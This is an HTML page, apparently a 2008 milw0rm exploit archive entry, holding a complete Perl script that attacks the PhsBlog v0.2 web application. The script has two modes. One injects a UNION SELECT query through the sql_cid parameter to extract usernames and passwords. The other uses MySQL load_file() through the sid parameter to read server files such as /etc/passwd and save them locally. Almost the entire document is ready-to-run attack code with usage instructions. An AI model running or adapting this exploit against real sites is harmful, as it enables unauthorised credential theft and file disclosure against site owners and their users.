<html><head><title>phsBlog 0.2 Bypass SQL Injection Filtering Exploit</title></head><pre>#!/usr/bin/perl
#----------------------------------------------------------------
#
#Script : PhsBlog v0.2
#
#Type : Bypass Sql injection Filtering Exploit
#
#Method : GET
#
#Risk : High
#
#----------------------------------------------------------------
#
#Discovered by : Khashayar Fereidani a.k.a. Dr.Crash
#
#My Official Website : HTTP://FEREIDANI.IR
#
#Khashayar Fereidani Email : irancrash [ a t ] gmail [ d o t] com
#
#----------------------------------------------------------------
#
#Khashayar Fereidani Official Website : HTTP://FEREIDANI.IR
#
#----------------------------------------------------------------
#
#Script Download :  http://www.phsdev.com/downloads/phsblog_current.zip
#
#----------------------------------------------------------------
#
#                        Tnx : God
#
#                     HTTP://IRCRASH.COM
#
#----------------------------------------------------------------

use LWP;
use HTTP::Request;
use Getopt::Long;
 
 
$scriptname=&quot;PhsBlog v0.2&quot;;

sub header
{
print &quot;
****************************************************
* $scriptname
****************************************************
*Discovered by : Khashayar Fereidani               *
*Exploited by : Khashayar Fereidani                *
*My Official Website : http://fereidani.ir         *
****************************************************&quot;;
}
 
sub usage
{
  print &quot;
* Usage : perl $0 http://Example/
****************************************************
&quot;;
}                                                                                  
 

$url = ($ARGV[0]);

if(!$url)
{
header();
usage();
exit;
}
if($url !~ /\//){$url = $url.&quot;/&quot;;}
if($url !~ /http:\/\//){$url = &quot;http://&quot;.$url;}
sub xpl1()
{
#concat(0x4c6f67696e3a,user,0x3c656e64757365723e,0x0d0a50617373776f72643a,password,0x3c656e64706173733e)
$vul = &quot;/index.php?sql_cid=999'union+select+0,1,2,3,4,concat(0x4c6f67696e3a,username,0x3c656e64757365723e,0x0d0a50617373776f72643a,password,0x3c656e64706173733e),6,7,8,9,10,11,12+from+phsblog_users/*&quot;;
$requestpage = $url.$vul;

 
my $req  = HTTP::Request-&gt;new(&quot;POST&quot;,$requestpage);
$ua = LWP::UserAgent-&gt;new;
$ua-&gt;agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req-&gt;referer($url);
$req-&gt;referer(&quot;IRCRASH.COM&quot;);
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;header(&quot;content-length&quot; =&gt; $contlen);
$req-&gt;content($poststring);
 
$response = $ua-&gt;request($req);
$content = $response-&gt;content;
$header = $response-&gt;headers_as_string();
 
@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/&lt;enduser&gt;/,$name);
$name = @name[0];
 
@password = split(/Password:/,$content);
$password = @password[1];
@password = split(/&lt;endpass&gt;/,$password);
$password = @password[0];

if(!$name &amp;&amp; !$password)
{
print &quot;\n\n&quot;;
print &quot;!Exploit failed ! :(\n\n&quot;;
exit;
}
 
print &quot;\n Username: &quot;.$name.&quot;\n\n&quot;;
print &quot; Password: &quot; .$password.&quot;\n\n&quot;;

 
}
 

#XPL2

sub xpl2()
{
print &quot;\n Example For File Address : /home/user/public_html/config.php\n Or /etc/passwd&quot;;
print &quot;\n Enter File Address :&quot;;
$fil3 = &lt;stdin&gt;;
#index.php?sql_cid=999'union+select+0,1,2,3,4,concat(0x4c6f67696e3a,load_file('$fil3'),0x3c656e64757365723e),6,7,8,9,10,11,12+from+phsblog_users/*
$vul = &quot;?show=pickup&amp;sid=99999'+union+select+0,concat(0x4c6f67696e3a,load_file('$fil3'),0x3c656e64757365723e),2,3,4,5,6,7,8,9,10,11,12,13+from+mysql.user/*&quot;;
$requestpage = $url.$vul;
 
my $req  = HTTP::Request-&gt;new(&quot;POST&quot;,$requestpage);
$ua = LWP::UserAgent-&gt;new;
$ua-&gt;agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req-&gt;referer($url);
$req-&gt;referer(&quot;IRCRASH.COM&quot;);
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;header(&quot;content-length&quot; =&gt; $contlen);
$req-&gt;content($poststring);

$response = $ua-&gt;request($req);
$content = $response-&gt;content;
$header = $response-&gt;headers_as_string();

 
@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/&lt;enduser&gt;/,$name);
$name = @name[0];


if(!$name &amp;&amp; !$password)
{
print &quot;\n\n&quot;;
print &quot;!Exploit failed ! :(\n\n&quot;;
exit;
}
 
open (FILE, &quot;&gt;&quot;.source.&quot;.txt&quot;);
print FILE $name;
close (FILE);
print &quot; File Save In source.txt\n&quot;;
print &quot;&quot;;
 
}

#XPL2 END
#Starting;
print &quot;
****************************************************
* $scriptname
****************************************************
*Discovered by : Khashayar Fereidani               *
*Exploited by : Khashayar Fereidani                *
*My Official Website : http://fereidani.ir         *
****************************************************
* Mod Options :                                    *
* Mod 1 : Find Script username and password        *
* Mod 2 : File Disclosure(not work in many servers)*
****************************************************&quot;;
print &quot;\n \n Enter Mod : &quot;;
$mod=&lt;stdin&gt;;
if ($mod==&quot;1&quot; or $mod==&quot;2&quot;) { print &quot;\n Exploiting .............. \n&quot;; } else { print &quot;\n Unknown Mod ! \n Exploit Failed !&quot;; };
if ($mod==&quot;1&quot;) { xpl1(); };
if ($mod==&quot;2&quot;) { xpl2(); };

# milw0rm.com [2008-09-11]</pre></html>